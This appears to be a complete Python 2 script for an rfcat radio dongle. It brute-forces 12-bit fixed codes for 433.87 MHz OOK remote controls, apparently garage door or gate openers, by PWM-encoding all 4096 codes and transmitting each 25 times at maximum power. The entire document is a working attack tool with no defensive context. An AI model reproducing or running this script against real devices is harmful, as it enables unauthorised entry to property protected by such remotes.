#!/usr/bin/env python
 
import sys
import time
import bitstring
from rflib import *
from struct import *
d = RfCat()
keyLen = 0
fixedLen = 8
baudRate = 4800
 
codes = []
 
def ConfigureD(d):
	d.setMdmModulation(MOD_ASK_OOK)
	d.setFreq(433872400)
	d.makePktFLEN(fixedLen)
	d.setMdmSyncMode(0)
	d.setMdmDRate(baudRate)
	d.setMaxPower()
 
print "Generating keys..."
#for dec_key in range(0,256):
for dec_key in range(0,4096):
	#print "Decimal key:",dec_key
	bin_key = bin(dec_key)
	print "Binary (NON PWM) key:",bin_key
	bin_str_key = str(bin_key)[2:] # there must be a better way sire.
	pwm_str_key = "11100" #added leading 0
	for k in bin_str_key:
		x = "*"
		if(k == "0"):
			x = "11100" #  A zero is encoded as a longer high pulse (high-high-low)
		if(k == "1"):
			x = "11000" # and a one is encoded as a shorter high pulse (high-low-low).
		pwm_str_key = pwm_str_key + x
	#print "Binary (PWM) key:",pwm_str_key
	#pad it
	for x in range(0,len(pwm_str_key) % 8):
		pwm_str_key = "0" + pwm_str_key
	dec_pwm_key = int(pwm_str_key,2);
	#encode it
	key_packed = bitstring.BitArray(bin(dec_pwm_key)).tobytes()
	key_packed = '\xFF\xFF' + key_packed + '\xFF\xFF'
	keyLen = len(key_packed)
	if(keyLen < fixedLen):
		for p in range(0,(fixedLen - keyLen)):
			key_packed = '\xFF' + key_packed
	keyLen = len(key_packed)
	#print "Key len:",keyLen
	#print "Key", key_packed.encode('hex')
	codes.append(key_packed)
print "Done."
print "numKeys:", len(codes)
 
print "Configuring device.."
ConfigureD(d)
print "Done."
numKeysDone = 0
print "TX'ing Keys"
for key in codes:
	numKeysDone = numKeysDone + 1
	for i in range(0,25):
		try:
			d.RFxmit(key)
		except Exception, e:
			print "Lost comms to USB device (most likely).. waiting 1 second, restarting it and going on"
			time.sleep(1)
			ConfigureD(d)
			continue
	if((numKeysDone*25) % 100 == 0):
		print "Sent ",numKeysDone*25, " keys (", numKeysDone , " keys ) of " , (len(codes) * 25) , " (at 25 requests per code) "
print "Completed."
